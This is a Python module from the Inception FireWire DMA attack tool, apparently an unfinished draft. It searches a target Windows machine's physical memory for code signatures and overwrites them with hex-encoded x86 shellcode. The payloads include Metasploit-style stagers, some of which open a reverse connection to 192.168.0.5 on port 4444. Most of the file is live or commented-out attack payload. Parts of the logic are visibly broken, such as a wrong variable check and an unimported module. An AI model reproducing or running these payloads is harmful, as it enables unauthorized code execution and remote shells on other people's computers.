'''
Inception - a FireWire physical memory manipulation and hacking tool exploiting
IEEE 1394 SBP-2 DMA.

Copyright (C) 2011-2013  Carsten Maartmann-Moe

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.

Created on Dec 5, 2013

@author: Carsten Maartmann-Moe <carsten@carmaa.com> aka ntropy
'''
from inception import firewire, cfg, term, util
from inception.screenlock import list_targets, select_target, searchanddestroy, patch
import time
import os

info = '''A description of the module goes here.'''

def run():
    print('Running')

    # Start msf and generate shellcode(s) (in a separate thread?)

    # Search for signature

    # Figure out what os & architecture we're attacking and select stage

    # Copy off original memory content in the region where stage 1 will be written

    # Patch with stage 1 - allocates a memory page and writes signature to frame boundary, and jumps to it

    # Search for signature

    # Restore the original memory content where stage 1 was written (overwrite it)

    # Patch with stage 2 - forks / creates and executes a new thread with prepended shellcode

    # Initialize and lower DMA shield
    if not cfg.filemode:
        try:
            fw = firewire.FireWire()
        except IOError:
            term.fail('Could not initialize FireWire. Are the modules ' +
                      'loaded into the kernel?')
        start = time.time()
        device_index = fw.select_device()

    # List targets
    #list_targets(targets)
       
    # Select target
    # target = {'OS': 'Windows 7',
    #         'versions': ['SP1'],
    #         'architectures': ['x86'],
    #         'name': 'msvp1_0 test',
    #         'notes': 'w00t',
    #         'signatures': [{'offsets': [0x268],
    #                         'chunks': [{'chunk': 0x90909090908bff558bec81ec,
    #                                     'internaloffset': 0x00,
    #                                     'patch': 0xe80000000060fce8890000006089e531d2648b52308b520c8b52148b72280fb74a2631ff31c0ac3c617c022c20c1cf0d01c7e2f052578b52108b423c01d08b407885c0744a01d0508b48188b582001d3e33c498b348b01d631ff31c0acc1cf0d01c738e075f4037df83b7d2475e2588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe0585f5a8b12eb865dbe000100006a406800100000566a006858a453e5ffd5680000000068400000006800010000506810e18ac366c700ffe0ffe0,
    #                                     'patchoffset': 0x29},
    #                                    {'chunk': 0x53, # push ebx
    #                                     'internaloffset': 0x20},
    #                                    {'chunk': 0x5657, # push esi; push edi
    #                                     'internaloffset': 0x27}]}]}
    # target = {'OS': 'Windows 7',
    #         'versions': ['SP1'],
    #         'architectures': ['x86'],
    #         'name': 'calc.exe',
    #         'notes': 'w00t',
    #         'signatures': [{'offsets': [0x661],
    #                         'chunks': [{'chunk': 0x8bff558bec83ec54535657,
    #                                     'internaloffset': 0x00,
    #                                     'patch': 0xe80000000060fce8890000006089e531d2648b52308b520c8b52148b72280fb74a2631ff31c0ac3c617c022c20c1cf0d01c7e2f052578b52108b423c01d08b407885c0744a01d0508b48188b582001d3e33c498b348b01d631ff31c0acc1cf0d01c738e075f4037df83b7d2475e2588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe0585f5a8b12eb865dbe000100006a406800100000566a006858a453e5ffd5680000000068400000006800010000506810e18ac366c700ffe0ffe0,
    #                                     'patchoffset': 0x00}]}]}
    # target = {'OS': 'Windows 7',
    #         'versions': ['SP1'],
    #         'architectures': ['x86'],
    #         'name': 'calc.exe',
    #         'notes': 'w00t',
    #         'signatures': [{'offsets': [0x86c],
    #                         'chunks': [{'chunk': 0xc20800909090909033c0,
    #                                     'internaloffset': 0x00,
    #                                     'patch': 0xe80000000060fce8890000006089e531d2648b52308b520c8b52148b72280fb74a2631ff31c0ac3c617c022c20c1cf0d01c7e2f052578b52108b423c01d08b407885c0744a01d0508b48188b582001d3e33c498b348b01d631ff31c0acc1cf0d01c738e075f4037df83b7d2475e2588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe0585f5a8b12eb865dbe000100006a406800100000566a006858a453e5ffd5680000000068400000006800010000506810e18ac366c700ffe0ffe0,
    #                                     'patchoffset': 0x00}]}]}

    # target = {'OS': 'Windows 7',
    #         'versions': ['SP1'],
    #         'architectures': ['x86'],
    #         'name': 'calc.exe istoolseton',
    #         'notes': 'w00t',
    #         'signatures': [{'offsets': [0x89a],
    #                         'chunks': [{'chunk': 0xc390909090908bff558bec83ec20,
    #                                     'internaloffset': 0x00,
    #                                     'patch': 0xe80000000060fce8890000006089e531d2648b52308b520c8b52148b72280fb74a2631ff31c0ac3c617c022c20c1cf0d01c7e2f052578b52108b423c01d08b407885c0744a01d0508b48188b582001d3e33c498b348b01d631ff31c0acc1cf0d01c738e075f4037df83b7d2475e2588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe0585f5a8b12eb865dbe000100006a406800100000566a006858a453e5ffd5680000000068400000006800010000506810e18ac366c700ffe0ffe0,
    #                                     'patchoffset': 0x00}]}]}

    #------------------------ WORKS -----------------------------------------#
    # target = {'OS': 'Windows 7',
    #         'versions': ['SP1'],
    #         'architectures': ['x86'],
    #         'name': 'calc.exe modified (no protect) nasm',
    #         'notes': 'w00t',
    #         'signatures': [{'offsets': [0x661],
    #                         'chunks': [{'chunk': 0x8bff558bec83ec54535657,
    #                                     'internaloffset': 0x00,
    #                                     'patch': 0xe80000000060fce8890000006089e531d2648b52308b520c8b52148b72280fb74a2631ff31c0ac3c617c022c20c1cf0d01c7e2f052578b52108b423c01d08b407885c0744a01d0508b48188b582001d3e33c498b348b01d631ff31c0acc1cf0d01c738e075f4037df83b7d2475e2588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe0585f5a8b12eb865dbe000100006a406800100000566a006858a453e5ffd566c700ffe0ffe0,
    #                                     'patchoffset': 0x00}]}]}

    target = {'OS': 'Windows XP',
            'versions': ['SP1'],
            'architectures': ['x86'],
            'name': 'calc.exe modified (no protect) nasm',
            'notes': 'w00t',
            'signatures': [{'offsets': [0x626],
                            'chunks': [{'chunk': 0x837c24040a53555657bd39,
                                        'internaloffset': 0x00,
                                        'patch': 0xe80000000060fce8890000006089e531d2648b52308b520c8b52148b72280fb74a2631ff31c0ac3c617c022c20c1cf0d01c7e2f052578b52108b423c01d08b407885c0744a01d0508b48188b582001d3e33c498b348b01d631ff31c0acc1cf0d01c738e075f4037df83b7d2475e2588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe0585f5a8b12eb865dbe000100006a406800100000566a006858a453e5ffd566c700ffe0ffe0,
                                        'patchoffset': 0x00}]}]}
    
    # Print selection. If verbose, print selection with signatures
    #term.info('Selected target: ' + target['OS'] + ': ' + target['name'])
    #if cfg.verbose:
    #    printdetails(target)
    
    # Lower DMA shield or use a file as input, and set memsize
    device = None
    memsize = None
    if cfg.filemode:
        device = util.MemoryFile(cfg.filename, cfg.PAGESIZE)
        memsize = os.path.getsize(cfg.filename)
    else:
        elapsed = int(time.time() - start)
        device = fw.getdevice(device_index, elapsed)
        memsize = cfg.memsize
    
    # Perform parallel search for all signatures for each OS at the known 
    # offsets
    term.info('DMA shields should be down by now. Attacking...')
    address, chunks = searchanddestroy(device, target, memsize)
    if not address:
        # TODO: Fall-back sequential search?
        return None, None
    
    # Signature found, let's patch
    mask = 0xfffff000 # Mask away the lower bits to find the page number
    page = int((address & mask) / cfg.PAGESIZE)
    term.info('Signature found at {0:#x} in page no. {1}'.format(address, page))
    if not cfg.dry_run:
        success, backup = patch(device, address, chunks)

        if success:
            if cfg.egg:
                sound.play('resources/inception.wav')
            term.info('Patch verified; successful')
            term.info('BRRRRRRRAAAAAWWWWRWRRRMRMRMMRMRMMMMM!!!')
        else:
            term.warn('Write-back could not be verified; patching *may* ' +
                      'have been unsuccessful')


    # -----------------------WORKS, but crashes sometimes ---------------------
    # target = {'OS': 'Windows 7',
    #         'versions': ['SP1'],
    #         'architectures': ['x86'],
    #         'name': 'signature',
    #         'notes': 'w00t',
    #         'signatures': [{'offsets': [0x00],
    #                         'chunks': [{'chunk': 0xffe0000000000000,
    #                                     'internaloffset': 0x00,
    #                                     'patch': 0xfce8890000006089e531d2648b52308b520c8b52148b72280fb74a2631ff31c0ac3c617c022c20c1cf0d01c7e2f052578b52108b423c01d08b407885c0744a01d0508b48188b582001d3e33c498b348b01d631ff31c0acc1cf0d01c738e075f4037df83b7d2475e2588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe0585f5a8b12eb865d31c05050508d9da80000005350506838680d16ffd561812c2405000000c358fce8890000006089e531d2648b52308b520c8b52148b72280fb74a2631ff31c0ac3c617c022c20c1cf0d01c7e2f052578b52108b423c01d08b407885c0744a01d0508b48188b582001d3e33c498b348b01d631ff31c0acc1cf0d01c738e075f4037df83b7d2475e2588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe0585f5a8b12eb865d6833320000687773325f54684c772607ffd5b89001000029c454506829806b00ffd5505050504050405068ea0fdfe0ffd5976a0568c0a80005680200115c89e66a1056576899a57461ffd585c0740cff4e0875ec68f0b5a256ffd56a006a0456576802d9c85fffd58b366a406800100000566a006858a453e5ffd593536a005653576802d9c85fffd501c329c685f675ecc3,
    #                                     #'patch': 0xe80000000060fce8890000006089e531d2648b52308b520c8b52148b72280fb74a2631ff31c0ac3c617c022c20c1cf0d01c7e2f052578b52108b423c01d08b407885c0744a01d0508b48188b582001d3e33c498b348b01d631ff31c0acc1cf0d01c738e075f4037df83b7d2475e2588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe0585f5a8b12eb865dbe000100006a406800100000566a006858a453e5ffd5680000000068400000006800010000506810e18ac366c700ffe0ffe0,
    #                                     'patchoffset': 0x00}]}]}

    #--------------Exit thread, works on XP------------------#
    target = {'OS': 'Windows XP',
            'versions': ['SP1'],
            'architectures': ['x86'],
            'name': 'signature',
            'notes': 'w00t',
            'signatures': [{'offsets': [0x00],
                            'chunks': [{'chunk': 0xffe0000000000000,
                                        'internaloffset': 0x00,
                                        'patch': 0xfce8890000006089e531d2648b52308b520c8b52148b72280fb74a2631ff31c0ac3c617c022c20c1cf0d01c7e2f052578b52108b423c01d08b407885c0744a01d0508b48188b582001d3e33c498b348b01d631ff31c0acc1cf0d01c738e075f4037df83b7d2475e2588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe0585f5a8b12eb865d31c05050508d9da80000005350506838680d16ffd561812c2405000000c358fce8890000006089e531d2648b52308b520c8b52148b72280fb74a2631ff31c0ac3c617c022c20c1cf0d01c7e2f052578b52108b423c01d08b407885c0744a01d0508b48188b582001d3e33c498b348b01d631ff31c0acc1cf0d01c738e075f4037df83b7d2475e2588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe0585f5a8b12eb865d6833320000687773325f54684c772607ffd5b89001000029c454506829806b00ffd5505050504050405068ea0fdfe0ffd5976a0568c0a80005680200115c89e66a1056576899a57461ffd585c0740cff4e0875ec68e01d2a0affd56a006a0456576802d9c85fffd58b366a406800100000566a006858a453e5ffd593536a005653576802d9c85fffd501c329c685f675ecc3,
                                        #'patch': 0xe80000000060fce8890000006089e531d2648b52308b520c8b52148b72280fb74a2631ff31c0ac3c617c022c20c1cf0d01c7e2f052578b52108b423c01d08b407885c0744a01d0508b48188b582001d3e33c498b348b01d631ff31c0acc1cf0d01c738e075f4037df83b7d2475e2588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe0585f5a8b12eb865dbe000100006a406800100000566a006858a453e5ffd5680000000068400000006800010000506810e18ac366c700ffe0ffe0,
                                        'patchoffset': 0x00}]}]}

        # Select target
    # target = {'OS': 'Windows 7',
    #         'versions': ['SP1'],
    #         'architectures': ['x86'],
    #         'name': 'calc.exe showhelp without sub esp',
    #         'notes': 'w00t',
    #         'signatures': [{'offsets': [0x00],
    #                         'chunks': [{'chunk': 0xffe0000000000000,
    #                                     'internaloffset': 0x00,
    #                                     'patch': 0xfce8890000006089e531d2648b52308b520c8b52148b72280fb74a2631ff31c0ac3c617c022c20c1cf0d01c7e2f052578b52108b423c01d08b407885c0744a01d0508b48188b582001d3e33c498b348b01d631ff31c0acc1cf0d01c738e075f4037df83b7d2475e2588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe0585f5a8b12eb865d31c05050508d9da10000005350506838680d16ffd561c358fce8890000006089e531d2648b52308b520c8b52148b72280fb74a2631ff31c0ac3c617c022c20c1cf0d01c7e2f052578b52108b423c01d08b407885c0744a01d0508b48188b582001d3e33c498b348b01d631ff31c0acc1cf0d01c738e075f4037df83b7d2475e2588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe0585f5a8b12eb865d6833320000687773325f54684c772607ffd5b89001000029c454506829806b00ffd5505050504050405068ea0fdfe0ffd5976a0568c0a80005680200115c89e66a1056576899a57461ffd585c0740cff4e0875ec68f0b5a256ffd56a006a0456576802d9c85fffd58b366a406800100000566a006858a453e5ffd593536a005653576802d9c85fffd501c329c685f675ecc3,
    #                                     #'patch': 0xe80000000060fce8890000006089e531d2648b52308b520c8b52148b72280fb74a2631ff31c0ac3c617c022c20c1cf0d01c7e2f052578b52108b423c01d08b407885c0744a01d0508b48188b582001d3e33c498b348b01d631ff31c0acc1cf0d01c738e075f4037df83b7d2475e2588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe0585f5a8b12eb865dbe000100006a406800100000566a006858a453e5ffd5680000000068400000006800010000506810e18ac366c700ffe0ffe0,
    #                                     'patchoffset': 0x00}]}]}

    # ------- with SEH handler, not needed? ----
    # target = {'OS': 'Windows 7',
    #         'versions': ['SP1'],
    #         'architectures': ['x86'],
    #         'name': 'signature',
    #         'notes': 'w00t',
    #         'signatures': [{'offsets': [0x00],
    #                         'chunks': [{'chunk': 0xffe0000000000000,
    #                                     'internaloffset': 0x00,
    #                                     'patch': 0xfce8890000006089e531d2648b52308b520c8b52148b72280fb74a2631ff31c0ac3c617c022c20c1cf0d01c7e2f052578b52108b423c01d08b407885c0744a01d0508b48188b582001d3e33c498b348b01d631ff31c0acc1cf0d01c738e075f4037df83b7d2475e2588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe0585f5a8b12eb865d31c05050508d9da80000005350506838680d16ffd561812c2405000000c358e80000000068da00000064ff350000000064892500000000e811000000648f050000000081c404000000c331c0c3fce8890000006089e531d2648b52308b520c8b52148b72280fb74a2631ff31c0ac3c617c022c20c1cf0d01c7e2f052578b52108b423c01d08b407885c0744a01d0508b48188b582001d3e33c498b348b01d631ff31c0acc1cf0d01c738e075f4037df83b7d2475e2588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe0585f5a8b12eb865d6833320000687773325f54684c772607ffd5b89001000029c454506829806b00ffd5505050504050405068ea0fdfe0ffd5976a0568c0a80005680200115c89e66a1056576899a57461ffd585c0740cff4e0875ec68f0b5a256ffd56a006a0456576802d9c85fffd58b366a406800100000566a006858a453e5ffd593536a005653576802d9c85fffd501c329c685f675ecc3,
    #                                     #'patch': 0xe80000000060fce8890000006089e531d2648b52308b520c8b52148b72280fb74a2631ff31c0ac3c617c022c20c1cf0d01c7e2f052578b52108b423c01d08b407885c0744a01d0508b48188b582001d3e33c498b348b01d631ff31c0acc1cf0d01c738e075f4037df83b7d2475e2588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe0585f5a8b12eb865dbe000100006a406800100000566a006858a453e5ffd5680000000068400000006800010000506810e18ac366c700ffe0ffe0,
    #                                     'patchoffset': 0x00}]}]}

    input()
    # Perform parallel search for all signatures for each OS at the known 
    # offsets
    term.info('DMA shields should be down by now. Attacking...')
    address2, chunks = searchanddestroy(device, target, memsize)
    if not address:
        # TODO: Fall-back sequential search?
        return None, None
    
    # Signature found, let's patch
    mask = 0xfffff000 # Mask away the lower bits to find the page number
    page = int((address2 & mask) / cfg.PAGESIZE)
    term.info('Signature found at {0:#x} in page no. {1}'.format(address2, page))
    if not cfg.dry_run:
        if cfg.revert:
            term.poll('Press [enter] to revert the patch:')
            input()
            device.write(address, backup)

            if backup == device.read(address, cfg.PAGESIZE):
                term.info('Revert patch verified; successful')
            else:
                term.warn('Revert patch could not be verified')
        
        #input()
        success, backup2 = patch(device, address2, chunks)
        if success:
            if cfg.egg:
                sound.play('resources/inception.wav')
            term.info('Patch verified; successful')
            term.info('BRRRRRRRAAAAAWWWWRWRRRMRMRMMRMRMMMMM!!!')
        else:
            term.warn('Write-back could not be verified; patching *may* ' +
                      'have been unsuccessful')


def usage():
    pass